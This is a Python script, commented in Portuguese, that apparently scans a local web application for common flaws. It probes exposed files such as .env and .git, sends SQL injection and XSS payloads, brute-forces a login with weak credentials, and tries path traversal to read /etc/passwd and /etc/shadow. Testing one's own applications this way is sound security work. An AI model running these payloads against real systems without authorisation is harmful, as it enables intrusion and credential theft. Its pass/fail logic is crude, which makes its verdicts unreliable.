import requests
import re

# Configuração
target_url = "http://localhost:5000"  # Alterar para o URL da aplicação
test_endpoints = [
    "/admin", "/config.php", "/backup.sql", "/users", "/.git", "/.env", "/wp-config.php", "/debug", "/phpinfo.php", "/robots.txt", "/sitemap.xml"
]

# Teste de acesso a endpoints protegidos
print("[+] Testando acesso a endpoints protegidos...")
for endpoint in test_endpoints:
    response = requests.get(target_url + endpoint)
    if response.status_code == 200:
        print(f"[!] POSSÍVEL FALHA: {endpoint} está acessível!")
    else:
        print(f"[OK] {endpoint} está protegido.")

# Teste avançado de injeção SQL
print("\n[+] Testando vulnerabilidade a SQL Injection...")
sqli_payloads = [
    {"username": "' OR '1'='1 --", "password": "password"},
    {"username": "admin' --", "password": "password"},
    {"username": "admin" , "password": "' OR '1'='1"},
    {"username": "' UNION SELECT null, username, password FROM users --", "password": "password"}
]
for payload in sqli_payloads:
    response = requests.post(target_url + "/login", data=payload)
    if "Welcome" in response.text or response.status_code == 200:
        print(f"[!] POSSÍVEL FALHA: SQL Injection detectada com payload {payload}")
    else:
        print(f"[OK] Proteção contra SQL Injection presente para {payload}.")

# Teste de força bruta leve no login
print("\n[+] Testando proteção contra ataques de força bruta no login...")
common_usernames = ["admin", "user", "test", "root", "guest", "administrator"]
common_passwords = ["password", "123456", "admin", "root", "qwerty", "12345"]
for user in common_usernames:
    for pwd in common_passwords:
        response = requests.post(target_url + "/login", data={"username": user, "password": pwd})
        if "Welcome" in response.text or response.status_code == 200:
            print(f"[!] POSSÍVEL FALHA: Credenciais fracas ({user}:{pwd}) funcionaram!")
        else:
            print(f"[OK] Credenciais {user}:{pwd} rejeitadas corretamente.")

# Teste de Cross-Site Scripting (XSS)
print("\n[+] Testando vulnerabilidade a Cross-Site Scripting (XSS)...")
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "' onmouseover=alert('XSS')"
]
for payload in xss_payloads:
    response = requests.post(target_url + "/search", data={"query": payload})
    if payload in response.text:
        print(f"[!] POSSÍVEL FALHA: XSS detectado com payload {payload}")
    else:
        print(f"[OK] Proteção contra XSS presente para {payload}.")

# Teste de Path Traversal
print("\n[+] Testando vulnerabilidade a Path Traversal...")
traversal_payloads = [
    "../../etc/passwd", "../../../windows/win.ini", "../../../../etc/shadow"
]
for payload in traversal_payloads:
    response = requests.get(target_url + f"/download?file={payload}")
    if "root:x:" in response.text or "[extensions]" in response.text:
        print(f"[!] POSSÍVEL FALHA: Path Traversal detectado com payload {payload}")
    else:
        print(f"[OK] Proteção contra Path Traversal presente para {payload}.")

# Teste de CORS
print("\n[+] Testando configuração de CORS...")
response = requests.options(target_url)
if "Access-Control-Allow-Origin" in response.headers:
    print(f"[!] POSSÍVEL FALHA: CORS mal configurado - {response.headers['Access-Control-Allow-Origin']}")
else:
    print("[OK] CORS configurado corretamente.")

# Teste concluído
print("\n[+] Testes concluídos.")